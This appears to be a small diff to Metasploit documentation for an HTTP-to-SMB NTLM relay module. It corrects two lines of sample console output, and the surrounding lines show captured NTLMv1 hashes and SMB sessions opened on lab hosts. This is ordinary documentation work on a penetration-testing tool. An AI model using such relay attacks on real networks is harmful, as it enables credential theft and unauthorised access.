@@ -103,7 +103,7 @@ msf auxiliary(server/relay/http_to_smb) >
 [HTTP] NTLMv1-SSP Username   : KERBEROS\sandy
 [HTTP] NTLMv1-SSP Hash       : sandy::KERBEROS:0c38c494a6e41dd000000000000000000000000000000000:9d43cb96cc90dfc171c1a34bff7e6c9a2b5d0d9b1d8b537a:e551856a84be7c2b
 
-[+] Identity: KERBEROS\sandy -  Successfully relayed NTLM authentication to LDAP!
+[+] Identity: KERBEROS\sandy -  Successfully relayed NTLM authentication to SMB!
 [+] Relay succeeded
 [*] SMB session 3 opened (172.16.199.1:51218 -> 172.16.199.201:445) at 2026-06-29 11:06:38 -0700
 [*] Moving to next target (172.16.199.200). Issuing 307 Redirect to /RRfvosEa4d
@@ -121,7 +121,7 @@ msf auxiliary(server/relay/http_to_smb) >
 [HTTP] NTLMv1-SSP Username   : KERBEROS\sandy
 [HTTP] NTLMv1-SSP Hash       : sandy::KERBEROS:2f8b113a0ca1366500000000000000000000000000000000:c6a2445de2e17cd581891231a3e780e434c59cf19ae566eb:52bbfcc4c36880e1
 
-[+] Identity: KERBEROS\sandy -  Successfully relayed NTLM authentication to LDAP!
+[+] Identity: KERBEROS\sandy -  Successfully relayed NTLM authentication to SMB!
 [+] Relay succeeded
 [*] SMB session 4 opened (172.16.199.1:51231 -> 172.16.199.200:445) at 2026-06-29 11:06:39 -0700
 [*] Target list exhausted for 172.16.199.130. Closing connection.
